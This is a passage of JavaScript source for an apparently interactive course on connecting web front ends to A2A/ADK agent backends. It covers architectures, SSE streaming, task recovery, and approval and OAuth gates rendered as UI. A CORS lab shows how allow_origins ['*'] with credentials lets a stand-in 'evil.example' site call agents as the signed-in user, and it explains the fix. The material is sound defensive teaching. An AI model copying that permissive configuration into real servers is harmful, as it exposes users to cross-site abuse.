/* Track 7 — Front ends: how web UIs and apps talk to agent backends.
 * Architectures, streaming into a page, approval/auth gates as UI, AG-UI,
 * rendering agent output safely, and a live lab that drives this repo's real
 * agents from the browser. Facts checked against ADK 2.8 / a2a-sdk 1.1.2 and
 * ag-ui-protocol 1.0 (see the lesson refs). */
(function () {
  "use strict";
  const PG = window.PG, h = PG.h, SPEC = PG.SPEC;

  function result(el, tone, html) { el.className = "result " + tone; el.innerHTML = html; }
  function btn(text, cls, onclick) { return h("button", { class: "btn " + (cls || ""), type: "button", text: text, onclick: onclick }); }

  /* A correct SSE parser for fetch() streams: buffers across chunk boundaries,
   * splits events on a blank line, joins multi-line data fields. */
  function sseParser(onData) {
    let buf = "";
    return function feed(text) {
      buf = (buf + text).replace(/\r\n/g, "\n");
      let i;
      while ((i = buf.indexOf("\n\n")) >= 0) {
        const block = buf.slice(0, i);
        buf = buf.slice(i + 2);
        const data = block.split("\n").filter(function (l) { return l.indexOf("data:") === 0; })
          .map(function (l) { return l.slice(5).replace(/^ /, ""); }).join("\n");
        if (data) onData(data);
      }
    };
  }
  PG.sseParser = sseParser;

  /* Frames shaped exactly like this repo's concierge emits over A2A 1.0
   * (captured from the real server, ids shortened). */
  function sampleFrames() {
    const fc = function (name, args, lr) { return { data: { id: "fc-" + name.slice(0, 4), name: name, args: args }, metadata: lr ? { adk_type: "function_call", adk_is_long_running: true } : { adk_type: "function_call" } }; };
    const fr = function (name, resp) { return { data: { id: "fc-" + name.slice(0, 4), name: name, response: resp }, metadata: { adk_type: "function_response" } }; };
    const su = function (state, parts) {
      const status = { state: "TASK_STATE_" + state };
      if (parts) status.message = { messageId: "m-" + PG.hex(2), role: "ROLE_AGENT", parts: parts };
      return { result: { statusUpdate: { taskId: "4729…", contextId: "1bc3…", status: status } } };
    };
    return [
      { result: { task: { id: "4729…", contextId: "1bc3…", status: { state: "TASK_STATE_SUBMITTED" } } } },
      su("WORKING"),
      su("WORKING", [fc("check_release_readiness", { service: "checkout-api", version: "2.14.0", environment: "production" })]),
      su("WORKING", [fr("check_release_readiness", { ready: true, risk: "high", requires_human_approval: true })]),
      su("WORKING", [fc("run_compliance_scan", { service: "checkout-api", environment: "production" })]),
      su("WORKING", [fr("run_compliance_scan", { passed: true, findings: [] })]),
      su("WORKING", [fc("request_change_approval", { service: "checkout-api", version: "2.14.0", environment: "production", risk: "high", summary: "Release checkout-api 2.14.0 to production" }, true)]),
      su("WORKING", [fr("request_change_approval", { status: "pending_human_approval", ticket_id: "CHG-B44BD1CF" })]),
      su("WORKING", [{ text: "Waiting on human approval for ticket CHG-B44BD1CF." }]),
      su("INPUT_REQUIRED", [fc("request_change_approval", { service: "checkout-api", version: "2.14.0", environment: "production", risk: "high", summary: "Release checkout-api 2.14.0 to production" }, true)]),
    ].map(function (f) { return Object.assign({ jsonrpc: "2.0", id: 1 }, f); });
  }

  /* ════════════════════════════════════════════════════════════════════
   * Lesson: From a screen to an agent
   * ════════════════════════════════════════════════════════════════════ */
  const ARCH = {
    direct: { label: "Browser speaks A2A", path: ["browser", "agent"],
      props: [false, true, false, false, true, false],
      note: "The page is an A2A client: it fetches the card, sends <code>SendStreamingMessage</code> with <code>fetch</code>, and renders the stream. Simple, and right for internal tools, demos and the last lesson of this track. But the agent must be reachable from every user's browser, allow their origin (CORS), and accept a token a browser can hold." },
    bff: { label: "Backend-for-frontend (BFF)", path: ["browser", "bff", "agent"],
      props: [true, true, true, true, false, true],
      note: "The browser talks to <em>your</em> backend with a session cookie; the backend is the A2A client. It holds tokens (and does lab 82's token exchange), receives push webhooks the browser never could, keeps agents private, fans out to several agents, and reshapes events for the UI. The default for production apps." },
    agui: { label: "AG-UI endpoint", path: ["browser", "bff", "agent"],
      props: [true, true, true, true, false, true],
      note: "A BFF that speaks a UI-shaped event protocol (AG-UI) to the browser: token-by-token text, tool-call events, shared state patches, interrupts. The server side translates A2A or ADK events into AG-UI. Libraries such as CopilotKit render it. Same security properties as a BFF, with a standard wire format to the screen." },
    native: { label: "Framework-native API", path: ["browser", "agent"],
      props: [false, false, false, false, true, false],
      note: "The page calls the agent framework's own HTTP API: for ADK, <code>POST /apps/{app}/users/{user}/sessions</code> then <code>POST /run_sse</code> with <code>{appName, userId, sessionId, newMessage, streaming}</code>. This is what ADK's Dev UI uses. Fast to build, but it is <em>not</em> A2A: tied to ADK, sessions instead of tasks, and every agent must be ADK." },
  };
  const PROPS = ["No secrets in the browser", "Works with any A2A agent", "Can receive push notifications", "Agents stay private (not internet-facing)", "One less network hop", "Events shaped for the UI"];

  PG.lesson({
    id: "fe-paths",
    track: "frontends",
    title: "From a screen to an agent",
    short: "Architectures",
    thesis: "A web UI can speak A2A itself, talk to a backend that does, use a UI-oriented protocol like AG-UI, or call the agent framework's own API. Which one decides where tokens live, who can receive push notifications, and whether your agents must face the internet.",
    refs: "Spec §7 auth · §3.2 delivery (push needs a reachable URL) · Fetch standard (CORS) · ADK get_fast_api_app (/run_sse) · AG-UI 1.0 · this repo: servers/*_server.py allow_origins",
    brief: `
      <h2>Four shapes</h2>
      <dl class="terms">
        <dt>Browser speaks A2A</dt><dd>The page is the A2A client. Needs CORS on the agent and a token the browser can hold (OAuth authorization code + PKCE, a <em>public</em> client: no client secret).</dd>
        <dt>Backend-for-frontend</dt><dd>The page talks to your backend over a session cookie; the backend is the A2A client. Tokens, push webhooks, fan-out and policy stay server-side.</dd>
        <dt>AG-UI</dt><dd>A BFF that streams a standard, UI-shaped event protocol to the page. Covered in its own lesson.</dd>
        <dt>Framework-native API</dt><dd>ADK's <code>/run_sse</code>, the Dev UI's API. Quick, but not A2A and ADK-only.</dd>
      </dl>
      <h2>Why a browser can't do everything an agent client can</h2>
      <ul>
        <li><strong>Push notifications need a URL the agent can POST to.</strong> A browser has none. Something server-side receives the webhook and forwards it (WebSocket, SSE, Web Push).</li>
        <li><strong>A browser can't keep a secret.</strong> Anything in page JavaScript, including a client secret, is readable by the user and by any script injected into the page.</li>
        <li><strong>Every call is cross-origin</strong> unless the agent is served from the page's own origin. The browser asks first (a CORS preflight, because <code>Content-Type: application/json</code>, <code>Authorization</code> and <code>A2A-Version</code> are not "simple"), and the agent must answer for that exact origin.</li>
      </ul>
      <div class="note ours"><span class="note-label">In this repo</span>Both servers used <code>allow_origins=["*"]</code>. ADK pairs that with <code>allow_credentials: true</code>, and Starlette then <em>echoes any origin back</em>: every website you visited could call these agents from your browser. Fixed: the default is now local pages only (<code>http://localhost</code> / <code>127.0.0.1</code>, any port), and <code>CORS_ALLOW_ORIGINS</code> overrides it. The same audit found that a 401 from the token check (lab 82) left without CORS headers, so a browser saw "Failed to fetch" instead of the challenge; the auth middleware now sits inside CORS.</div>`,
    lab: function (bench) {
      const a = PG.lab(bench, "Pick an architecture", "Lab · trade-off explorer");
      let arch = "bff", runToken = 0;
      const stage = PG.stage(a.body, {
        size: "short",
        actors: [
          { id: "browser", role: "user", label: "Browser", sub: "your web UI", x: 12, y: 46, glyph: "W" },
          { id: "bff", role: "proxy", label: "Your backend", sub: "BFF", x: 45, y: 46, glyph: "B" },
          { id: "agent", role: "server", label: "ops-concierge", sub: "A2A agent", x: 80, y: 46 },
        ],
        links: [["browser", "bff"], ["bff", "agent"], ["browser", "agent"]],
      });
      const table = h("div", { class: "stack" });
      const note = h("div", { class: "result" });
      a.body.insertBefore(PG.seg(Object.keys(ARCH).map(function (k) { return { v: k, label: ARCH[k].label }; }), arch, function (v) { arch = v; paint(); }, "Architecture"), stage.el);
      a.body.appendChild(table);
      a.body.appendChild(note);
      async function paint() {
        const my = ++runToken;
        const A = ARCH[arch];
        stage.set("bff", { dim: A.path.indexOf("bff") < 0, label: arch === "agui" ? "AG-UI backend" : "Your backend" });
        stage.actors.bff.node.querySelector(".a-sub").textContent = arch === "agui" ? "ag-ui-adk / CopilotKit runtime" : "BFF";
        stage.actors.agent.node.querySelector(".a-sub").textContent = arch === "native" ? "ADK /run_sse" : "A2A agent";
        table.innerHTML = "";
        PROPS.forEach(function (p, i) {
          table.appendChild(h("div", { class: "row" }, h("span", { class: "chip " + (A.props[i] ? "ok" : "err"), text: A.props[i] ? "yes" : "no" }), h("span", { class: "small", text: p })));
        });
        result(note, "info", A.note);
        const label = { direct: "SendStreamingMessage + Bearer", bff: "cookie session", agui: "RunAgentInput", native: "POST /run_sse" }[arch];
        for (let i = 0; i < A.path.length - 1; i++) {
          if (my !== runToken) return;
          await stage.send(A.path[i], A.path[i + 1], i === 0 ? label : arch === "agui" || arch === "bff" ? "A2A + exchanged token" : label);
        }
        for (let i = A.path.length - 1; i > 0; i--) {
          if (my !== runToken) return;
          await stage.send(A.path[i], A.path[i - 1], i === 1 ? (arch === "agui" ? "AG-UI events" : arch === "native" ? "ADK events (SSE)" : arch === "bff" ? "SSE / WebSocket" : "A2A SSE") : "A2A SSE");
        }
      }
      paint();

      /* Lab B: CORS preflight */
      const b = PG.lab(bench, "Will the browser let the page call the agent?", "Lab · CORS preflight");
      const c = { origin: "http://localhost:8765", allow: "local", auth: true, cookies: false };
      const out = h("pre", { class: "code wrap" });
      const verdict = h("div", { class: "result" });
      function seg(label, opts, key) { return h("div", { class: "row" }, h("span", { class: "small mono", style: { minWidth: "150px" }, text: label }), PG.seg(opts, c[key], function (v) { c[key] = v; run(); }, label)); }
      b.body.appendChild(h("div", { class: "stack" },
        seg("page origin", [{ v: "http://localhost:8765", label: "localhost:8765" }, { v: "https://app.example.com", label: "app.example.com" }, { v: "https://evil.example", label: "evil.example" }], "origin"),
        seg("agent allows", [{ v: "star", label: "[\"*\"] (repo before)" }, { v: "local", label: "local pages (repo now)" }, { v: "app", label: "https://app.example.com" }], "allow"),
        h("div", { class: "row" }, PG.switch("cors-auth", "Request carries Authorization", c.auth, function (v) { c.auth = v; run(); }),
          PG.switch("cors-cred", "credentials: 'include' (cookies)", c.cookies, function (v) { c.cookies = v; run(); })),
        verdict, out));
      function run() {
        const reqHeaders = ["a2a-version", "content-type"].concat(c.auth ? ["authorization"] : []);
        const local = /^http:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(c.origin);
        const allowed = c.allow === "star" ? true : c.allow === "local" ? local : c.origin === "https://app.example.com";
        let text = "OPTIONS /a2a/ops_concierge HTTP/1.1\nOrigin: " + c.origin + "\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: " + reqHeaders.join(",") + "\n\n";
        if (!allowed) {
          text += "HTTP/1.1 403 Forbidden\n(no Access-Control-Allow-Origin)";
          result(verdict, "ok", "<b>Blocked by the browser.</b> The agent didn't allow <code>" + c.origin + "</code>, so the browser never sends the POST. CORS protects <em>users</em> from other sites, not your agent from attackers: curl ignores it entirely. Authenticate every request regardless.");
        } else {
          text += "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: " + c.origin + "\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Headers: " + reqHeaders.join(",") + "\nAccess-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT\nVary: Origin\n\nPOST /a2a/ops_concierge HTTP/1.1  ← now the browser sends it";
          const evil = c.origin === "https://evil.example";
          result(verdict, evil ? "warn" : "ok", evil
            ? "<b>Allowed, and it shouldn't be.</b> With <code>[\"*\"]</code> and credentials on, ADK's CORS layer echoes <em>whatever origin asked</em>. The CORS spec forbids <code>*</code> with credentials; echoing the origin sidesteps that rule rather than honouring it. " + (c.cookies ? "With cookie auth, evil.example can now act as the signed-in user." : "Bearer tokens in page memory don't travel cross-site, but anything relying on cookies or on \"only my browser can reach localhost\" is exposed.")
            : "<b>Allowed.</b> The preflight named this origin, so the browser sends the real request." + (c.auth ? " <code>Authorization</code> is listed, so the token may be attached." : ""));
        }
        out.textContent = text;
      }
      run();
    },
    quiz: [
      { q: "Why can't a browser page receive A2A push notifications?",
        opts: ["Browsers can't parse JSON", "Push needs a URL the agent can POST to; a page has none", "Push is gRPC-only", "CORS forbids it"],
        a: 1, why: "Something server-side (a BFF) must receive the webhook and relay it to the page." },
      { q: "A browser POSTs JSON-RPC to an agent on another origin. What happens first?",
        opts: ["Nothing special", "An OPTIONS preflight asking whether this origin may send these headers", "A WebSocket upgrade", "A GET for the card, always"],
        a: 1, why: "application/json, Authorization and A2A-Version are non-simple, so the browser preflights." },
      { q: "ADK with allow_origins [\"*\"] and credentials. A request from https://evil.example…",
        opts: ["is rejected: * can't be used with credentials", "is allowed: the origin is echoed back", "gets a 401", "is redirected"],
        a: 1, why: "Starlette echoes the requesting origin when * meets allow_credentials. List real origins instead." },
    ],
  });

  /* ════════════════════════════════════════════════════════════════════
   * Lesson: Streaming into a page
   * ════════════════════════════════════════════════════════════════════ */
  PG.lesson({
    id: "fe-stream",
    track: "frontends",
    title: "Streaming into a page",
    short: "Streaming into a page",
    thesis: "A2A streams over Server-Sent Events, but a browser's EventSource can't send a POST with a JSON body and an Authorization header. Pages read the stream with fetch, parse it themselves, and must survive the stream ending before the task does.",
    refs: "Spec §3.1.2 SendStreamingMessage · §3.1.6 SubscribeToTask · §3.1.3 GetTask · §3.1.5 CancelTask · HTML Living Standard §9.2 (SSE)",
    brief: `
      <h2>Not EventSource</h2>
      <p><code>new EventSource(url)</code> only does GET and can't set headers. <code>SendStreamingMessage</code> is a POST with a JSON-RPC body, and usually a bearer token. So: <code>fetch()</code>, then read <code>response.body</code> chunk by chunk and parse SSE yourself (or use a small library that does exactly that).</p>
      <h2>Parsing rules that bite</h2>
      <ul>
        <li>A network chunk is <em>not</em> an event. One chunk can hold half an event, or three. Buffer until a blank line.</li>
        <li>An event may have several <code>data:</code> lines; join them with newlines.</li>
        <li>Each event's data is one JSON-RPC response whose <code>result</code> is a <code>StreamResponse</code>: exactly one of <code>task</code>, <code>message</code>, <code>statusUpdate</code>, <code>artifactUpdate</code>. An <code>error</code> can arrive mid-stream too.</li>
      </ul>
      <h2>Rendering</h2>
      <ul>
        <li><code>task</code> (first): remember <code>id</code> and <code>contextId</code> right away; that is your handle if the stream dies.</li>
        <li><code>statusUpdate</code>: update the state badge; render any message parts (text, or, with ADK, tool calls and results as <code>data</code> parts).</li>
        <li><code>artifactUpdate</code>: create or <em>append</em> (<code>append: true</code>) by <code>artifactId</code>; <code>lastChunk</code> closes it.</li>
        <li>Key everything by id, so replaying an update after a reconnect doesn't duplicate it.</li>
      </ul>
      <h2>When the stream ends early</h2>
      <p>Reloads, laptop lids, mobile networks and proxy idle timeouts all close the connection while the task carries on. Keep the task id (URL or <code>sessionStorage</code>), then <code>GetTask</code> to catch up and <code>SubscribeToTask</code> to keep listening. And note: a <strong>Stop</strong> button that aborts the <code>fetch</code> only closes <em>your</em> connection. To stop the work, send <code>CancelTask</code>.</p>`,
    lab: function (bench) {
      const a = PG.lab(bench, "Parse a real stream, chunk by chunk", "Lab · SSE over fetch()");
      const frames = sampleFrames();
      const raw = frames.map(function (f) { return "data: " + JSON.stringify(f) + "\n\n"; }).join("");
      let size = 64, mode = "buffered";
      const out = h("div", { class: "stack" });
      const res = h("div", { class: "result" });
      const code = h("pre", { class: "code", text: "function sseParser(onData) {\n  let buf = \"\";\n  return function feed(text) {\n    buf = (buf + text).replace(/\\r\\n/g, \"\\n\");\n    let i;\n    while ((i = buf.indexOf(\"\\n\\n\")) >= 0) {        // one whole event\n      const block = buf.slice(0, i); buf = buf.slice(i + 2);\n      const data = block.split(\"\\n\")\n        .filter(l => l.startsWith(\"data:\"))\n        .map(l => l.slice(5).replace(/^ /, \"\")).join(\"\\n\");\n      if (data) onData(data);                            // JSON.parse(data) here\n    }\n  };\n}\n\nconst reader = res.body.pipeThrough(new TextDecoderStream()).getReader();\nfor (;;) { const { value, done } = await reader.read(); if (done) break; feed(value); }" });
      a.body.appendChild(h("div", { class: "stack" },
        h("div", { class: "row" }, h("span", { class: "small muted", text: "Network chunk size:" }),
          PG.seg([{ v: 37, label: "37 B" }, { v: 64, label: "64 B" }, { v: 256, label: "256 B" }, { v: 100000, label: "whole body" }], size, function (v) { size = Number(v); run(); }, "Chunk size"),
          h("span", { class: "small muted", text: "Parser:" }),
          PG.seg([{ v: "naive", label: "split each chunk on newlines" }, { v: "buffered", label: "buffer until a blank line" }], mode, function (v) { mode = v; run(); }, "Parser")),
        res, out, h("p", { class: "eyebrow", text: "The buffered parser (what this site uses)" }), code));
      function run() {
        out.innerHTML = "";
        const chunks = [];
        for (let i = 0; i < raw.length; i += size) chunks.push(raw.slice(i, i + size));
        const got = [], errors = [];
        if (mode === "naive") {
          chunks.forEach(function (c) {
            c.split("\n").forEach(function (l) {
              if (l.indexOf("data:") !== 0) return;
              try { got.push(JSON.parse(l.slice(5))); } catch (e) { errors.push(l.slice(0, 48) + "…"); }
            });
          });
        } else {
          const feed = sseParser(function (d) { try { got.push(JSON.parse(d)); } catch (e) { errors.push(d.slice(0, 48)); } });
          chunks.forEach(feed);
        }
        const states = got.map(function (f) { const v = f.result && (f.result.task || f.result.statusUpdate); return v && v.status ? v.status.state.replace("TASK_STATE_", "") : null; }).filter(Boolean);
        out.appendChild(h("div", { class: "row" }, h("span", { class: "chip mono", text: chunks.length + " chunks" }), h("span", { class: "chip " + (got.length === frames.length ? "ok" : "err"), text: got.length + " / " + frames.length + " events parsed" }), errors.length ? h("span", { class: "chip err", text: errors.length + " JSON errors" }) : null));
        out.appendChild(h("div", { class: "row" }, states.filter(function (s, i) { return states[i - 1] !== s; }).map(function (s) { return PG.stateChip(s); })));
        if (errors.length) out.appendChild(h("pre", { class: "code wrap", text: "JSON.parse failed on:\n" + errors.slice(0, 4).join("\n") }));
        result(res, got.length === frames.length && !errors.length ? "ok" : "warn",
          got.length === frames.length && !errors.length
            ? (mode === "naive" ? "<b>Lucky.</b> With the whole body in one chunk, the naive parser works — on your laptop. Real networks split events anywhere; pick a smaller chunk." : "<b>Every event, in order.</b> Ten frames, captured in the shape this repo's concierge really sends, parsed at any chunk size.")
            : "<b>Broken.</b> Events cut across chunk boundaries produce half-JSON. Some updates silently vanish, which shows up as a UI stuck on an old state.");
      }
      run();

      /* Lab B: reload / stop */
      const b = PG.lab(bench, "The tab reloads mid-task", "Lab · resilience");
      let strat = "both";
      const stage = PG.stage(b.body, { size: "short", actors: [
        { id: "page", role: "user", label: "Web page", sub: "chat view", x: 14, y: 46, glyph: "W" },
        { id: "agent", role: "server", label: "ops-concierge", sub: "task keeps running", x: 82, y: 46 }], links: [["page", "agent"]] });
      const bres = h("div", { class: "result", text: "Start a release, reload the tab during the compliance scan, then see what the page can recover." });
      const view = h("div", { class: "stack small mono" });
      const go = btn("Start, then reload at 40 %", "primary", runB);
      const stop = btn("Instead: press Stop (abort the fetch)", "danger small", runStop);
      b.body.insertBefore(h("div", { class: "stack" },
        h("div", { class: "row" }, h("span", { class: "small muted", text: "After the reload the page…" }),
          PG.seg([{ v: "forget", label: "starts fresh" }, { v: "get", label: "GetTask from the saved id" }, { v: "both", label: "GetTask + SubscribeToTask" }], strat, function (v) { strat = v; }, "Strategy")),
        h("div", { class: "row" }, go, stop)), stage.el);
      b.body.appendChild(view);
      b.body.appendChild(bres);
      function line(t, tone) { view.appendChild(h("div", { style: tone ? { color: "var(--" + tone + ")" } : {}, text: t })); }
      async function runB() {
        go.disabled = true; view.innerHTML = "";
        stage.badge("page", null); stage.badge("agent", null);
        await stage.send("page", "agent", "SendStreamingMessage");
        stage.hold("page", "agent", true, "server");
        line("← task 4729… WORKING (saved to sessionStorage: a2a.task=4729…)");
        await stage.send("agent", "page", "statusUpdate · scan started");
        line("← statusUpdate · run_compliance_scan started");
        stage.hold("page", "agent", false);
        stage.badge("page", h("span", { class: "chip err", text: "reloaded" }));
        line("⟳ tab reloaded: the stream is gone, the task is not", "warn");
        await PG.sleep(600);
        stage.badge("agent", h("span", { class: "chip", text: "scan… approval" }));
        if (strat === "forget") {
          line("page starts empty; nothing points at task 4729…", "err");
          result(bres, "warn", "<b>✗ Lost.</b> The release is still running and will park at the approval gate, but this page has no idea. A user who clicks Send again starts a <em>second</em> release.");
        } else {
          await stage.send("page", "agent", "GetTask 4729…");
          await stage.send("agent", "page", "task snapshot");
          line("→ GetTask {id: 4729…, historyLength: 20} → WORKING, history restored");
          if (strat === "get") {
            result(bres, "info", "<b>Half-recovered.</b> The page shows where things stood, then goes quiet: it is no longer subscribed. Poll <code>GetTask</code>, or…");
          } else {
            await stage.send("page", "agent", "SubscribeToTask");
            stage.hold("page", "agent", true, "server");
            line("→ SubscribeToTask {id: 4729…} → live again");
            await stage.send("agent", "page", "INPUT_REQUIRED");
            line("← statusUpdate · INPUT_REQUIRED · approval card rendered");
            stage.hold("page", "agent", false);
            result(bres, "ok", "<b>✓ Seamless.</b> Snapshot, then live updates, keyed by id so nothing duplicates. The user sees the approval card as if nothing happened.");
          }
        }
        go.disabled = false;
      }
      async function runStop() {
        view.innerHTML = "";
        await stage.send("page", "agent", "SendStreamingMessage");
        line("user presses Stop → controller.abort()");
        stage.badge("page", h("span", { class: "chip", text: "aborted" }));
        stage.badge("agent", h("span", { class: "chip warn", text: "still WORKING" }));
        line("the connection closed; the agent never heard about it", "warn");
        result(bres, "warn", "<b>Aborting a fetch is not cancelling a task.</b> The release carries on server-side. A Stop button must send <code>CancelTask {id}</code> (and can abort the stream after).");
      }
    },
    quiz: [
      { q: "Why can't a page use EventSource for SendStreamingMessage?",
        opts: ["EventSource doesn't support SSE", "It only does GET and can't set headers or a JSON body", "A2A streams are WebSockets", "Browsers block SSE"],
        a: 1, why: "Use fetch() and parse the body stream." },
      { q: "A chunk ends in the middle of a data: line. A correct parser…",
        opts: ["drops it", "keeps it in a buffer until the event's blank line arrives", "throws", "requests the rest"],
        a: 1, why: "Chunks and events are unrelated; buffer until \\n\\n." },
      { q: "The user presses Stop and the page calls controller.abort() on the fetch. The task…",
        opts: ["is canceled", "keeps running; only CancelTask stops it", "fails", "is deleted"],
        a: 1, why: "Closing a connection is not a protocol operation." },
    ],
  });

  /* ════════════════════════════════════════════════════════════════════
   * Lesson: Approvals and sign-ins in the UI
   * ════════════════════════════════════════════════════════════════════ */
  PG.lesson({
    id: "fe-gates",
    track: "frontends",
    title: "Approvals and sign-ins in the UI",
    short: "Gates as UI",
    thesis: "INPUT_REQUIRED and AUTH_REQUIRED are where an agent hands control to a person. The UI's job is to show exactly what is being asked, collect an answer in the shape the agent expects, and send it back on the same task.",
    refs: "Spec §4.1.3 TaskState (interrupted) · §7.6 in-task authorization · this repo: common/a2a_wire.py function_response_message, make wrong-resume",
    brief: `
      <h2>What is being asked?</h2>
      <p>A2A puts the question in the task's status message. Plain agents ask in text. ADK agents ask with a <strong>pending function call</strong>: a <code>data</code> part with <code>metadata.adk_type: "function_call"</code> and <code>adk_is_long_running: true</code>, carrying the tool name and arguments. That is structured enough to render a real form: service, version, environment, risk.</p>
      <h2>Answering it</h2>
      <p>Send a message on the <em>same</em> <code>taskId</code> with a <code>data</code> part <code>{id, name, response}</code> tagged <code>adk_type: "function_response"</code>, where <code>id</code> matches the pending call. A plain-text "approved" does <strong>not</strong> resume an ADK gate: it runs the agent again and can end the task with the gate unanswered (<code>make wrong-resume</code> in this repo shows it).</p>
      <h2>Who may answer?</h2>
      <p>The person who asked is often not the person who approves. Route the card to the approver (an inbox, a chat message), and enforce the rule server-side: lab 82's scope check refuses Bob no matter what button a UI shows him. A hidden button is not access control.</p>
      <h2>AUTH_REQUIRED</h2>
      <p>The agent needs a credential it doesn't have (say, write access to a repo). The UI shows "Connect GitHub", runs the OAuth flow in a popup or redirect (authorization code + PKCE), and the credential reaches the agent out of band, never pasted into a message part. Then the task continues.</p>`,
    lab: function (bench) {
      const a = PG.lab(bench, "Render the gate, answer it correctly", "Lab · approval UI");
      const frames = sampleFrames();
      let answer = "fr";
      const chat = h("div", { class: "chat" });
      const sent = h("pre", { class: "code" });
      const res = h("div", { class: "result", text: "Play the stream, then decide." });
      const play = btn("Play the stream", "primary", run);
      a.body.appendChild(h("div", { class: "stack" },
        h("div", { class: "row" }, play, h("span", { class: "small muted", text: "The UI answers with:" }),
          PG.seg([{ v: "fr", label: "function_response DataPart" }, { v: "text", label: "plain text “approved”" }], answer, function (v) { answer = v; }, "Answer shape")),
        chat, res, h("p", { class: "eyebrow", text: "What the UI sends" }), sent));
      function bubble(cls, kids) { const b = h("div", { class: "bubble " + cls }, kids); chat.appendChild(b); chat.scrollTop = chat.scrollHeight; return b; }
      async function run() {
        play.disabled = true; chat.innerHTML = ""; sent.textContent = "";
        bubble("me", "Deploy checkout-api 2.14.0 to production");
        let pending = null, ticket = null;
        for (const f of frames) {
          await PG.sleep(220);
          const su = f.result.statusUpdate;
          if (!su || !su.status.message) continue;
          su.status.message.parts.forEach(function (p) {
            const m = p.metadata || {};
            if (m.adk_type === "function_call" && su.status.state === "TASK_STATE_WORKING") bubble("tool", "🔧 " + p.data.name + " " + JSON.stringify(p.data.args).slice(0, 70));
            else if (m.adk_type === "function_response") { bubble("tool", "↩ " + p.data.name + " → " + JSON.stringify(p.data.response).slice(0, 70)); if (p.data.response.ticket_id) ticket = p.data.response.ticket_id; }
            else if (p.text) bubble("agent", p.text);
            if (m.adk_is_long_running && su.status.state === "TASK_STATE_INPUT_REQUIRED") pending = p.data;
          });
        }
        const g = pending.args;
        const note = h("input", { class: "inline", type: "text", value: "Change window confirmed", "aria-label": "Note" });
        const card = bubble("gate", [h("div", { class: "row" }, PG.stateChip("INPUT_REQUIRED"), h("b", { text: "Approval needed · " + ticket })),
          h("dl", { class: "kv" }, h("dt", { text: "service" }), h("dd", { text: g.service + " " + g.version }), h("dt", { text: "environment" }), h("dd", { text: g.environment }), h("dt", { text: "risk" }), h("dd", { text: g.risk })),
          h("div", { class: "row" }, note, btn("Approve", "server small", function () { decide(true); }), btn("Reject", "danger small", function () { decide(false); }))]);
        result(res, "info", "The card was generated from the pending call's <code>args</code>, not from parsing the agent's sentence.");
        function decide(ok) {
          card.querySelectorAll("button").forEach(function (b) { b.disabled = true; });
          const msg = answer === "fr"
            ? SPEC.msg("user", [{ data: { id: pending.id, name: pending.name, response: { ticket_id: ticket, approved: ok, decided_by: "release-manager@web-ui", note: note.value } }, metadata: { adk_type: "function_response" } }], { taskId: "4729…", contextId: "1bc3…" })
            : SPEC.msg("user", [ok ? "approved" : "rejected"], { taskId: "4729…", contextId: "1bc3…" });
          sent.innerHTML = PG.jsonHTML(SPEC.rpc("SendStreamingMessage", { message: msg }), ["id", "taskId", "adk_type", "approved"]);
          if (answer === "fr") {
            bubble("agent", ok ? "Deployment job job-5dd9 is running; awaiting its result." : "Release rejected for checkout-api 2.14.0. Nothing was deployed.");
            result(res, "ok", "<b>✓ Resumed.</b> Same task, a DataPart whose <code>id</code> matches the pending call. ADK routed it to the tool that was waiting" + (ok ? " and moved on to the deployment job." : "; the agent reported the rejection."));
          } else {
            bubble("agent", "I can deploy checkout-api 2.14.0 — shall I open a change ticket?");
            result(res, "warn", "<b>✗ Didn't resume.</b> To ADK, “" + (ok ? "approved" : "rejected") + "” is a new user turn, not the answer to <code>" + pending.name + "</code>. The agent starts over; the gate is never answered. Exactly what <code>make wrong-resume</code> demonstrates against the real agents.");
          }
          play.disabled = false;
        }
      }

      /* Lab B: AUTH_REQUIRED */
      const b = PG.lab(bench, "The agent needs your GitHub access", "Lab · in-task sign-in");
      const stage = PG.stage(b.body, { actors: [
        { id: "ui", role: "user", label: "Web UI", sub: "task view", x: 12, y: 30, glyph: "W" },
        { id: "agent", role: "server", label: "release agent", sub: "needs to push a tag", x: 80, y: 30 },
        { id: "idp", role: "auth", label: "GitHub OAuth", sub: "popup", x: 46, y: 80 }], links: [["ui", "agent"], ["ui", "idp"], ["idp", "agent"]] });
      const bres = h("div", { class: "result", text: "Run it." });
      b.body.insertBefore(btn("Run", "primary", async function () {
        stage.badge("agent", null); stage.badge("ui", null);
        await stage.send("agent", "ui", "AUTH_REQUIRED");
        stage.badge("ui", h("span", { class: "chip warn", text: "Connect GitHub →" }));
        await PG.sleep(400);
        await stage.send("ui", "idp", "authorize?code_challenge=…");
        await stage.send("idp", "ui", "code (popup closes)");
        await stage.send("ui", "idp", "token (via backend)");
        await stage.send("idp", "agent", "credential stored for alice");
        stage.badge("agent", PG.stateChip("WORKING"));
        await stage.send("ui", "agent", "continue task");
        await stage.send("agent", "ui", "COMPLETED");
        stage.badge("ui", PG.stateChip("COMPLETED"));
        result(bres, "ok", "<b>The UI orchestrated a sign-in; it never handled the agent's credential.</b> The code exchange happens server-side (a BFF or the agent's own OAuth callback), the credential is stored where the agent can use it, and the UI just continues the task. Pasting a token into a message part would put it in the task history forever.");
      }), stage.el);
      b.body.appendChild(bres);
    },
    quiz: [
      { q: "An ADK agent is INPUT_REQUIRED on request_change_approval. How does a UI resume it?",
        opts: ["Send “approved” as text", "Send a data part {id, name, response} tagged adk_type function_response on the same taskId", "Call GetTask", "Start a new task"],
        a: 1, why: "The id must match the pending call; text starts a new turn instead." },
      { q: "The approve button is hidden for Bob in the UI. Is that access control?",
        opts: ["Yes", "No: the server must refuse Bob regardless of what the UI shows", "Only with HTTPS", "Only for gRPC"],
        a: 1, why: "Enforce on the server (scope check, policy). UIs are suggestions." },
      { q: "During AUTH_REQUIRED, where should the new credential go?",
        opts: ["Into a message part", "Out of band: an OAuth flow whose result the agent can use, then continue the task", "Into the Agent Card", "Into localStorage"],
        a: 1, why: "Credentials in parts end up in task history." },
    ],
  });

  /* ════════════════════════════════════════════════════════════════════
   * Lesson: AG-UI
   * ════════════════════════════════════════════════════════════════════ */
  function aguiFor(frame, st) {
    const out = [];
    const r = frame.result;
    if (r.task) {
      st.thread = r.task.contextId; st.run = "run-" + PG.hex(2);
      out.push({ type: "RUN_STARTED", threadId: st.thread, runId: st.run });
      return out;
    }
